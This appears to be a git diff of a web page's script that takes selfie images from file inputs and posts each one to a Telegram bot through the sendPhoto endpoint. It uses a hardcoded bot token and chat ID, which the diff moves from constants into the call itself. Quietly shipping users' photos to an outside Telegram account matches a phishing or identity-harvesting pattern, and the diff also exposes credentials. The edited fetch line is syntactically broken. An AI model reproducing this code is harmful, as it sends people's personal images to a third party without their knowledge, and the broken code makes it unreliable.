@@ -88,9 +88,6 @@
         }
     </script>
     <script>
-    const telegramBotToken = '5478352215:AAFrp-rnONqwGgt0JjpsVWEkraTudqZ12WI';
-    const chatId = '1205804127';
-    
     const inputFiles = [
         document.getElementById('selfieInput1'),
         document.getElementById('selfieInput2'),
@@ -117,10 +114,10 @@
 
     async function sendPhotoToTelegram(file) {
         const formData = new FormData();
-        formData.append('chat_id', chatId);
+        formData.append('chat_id', 1205804127);
         formData.append('photo', file);
 
-        await fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
+        await fetch(https://api.telegram.org/bot${5478352215:AAFrp-rnONqwGgt0JjpsVWEkraTudqZ12WI}/sendPhoto, {
             method: 'POST',
             body: formData
         });
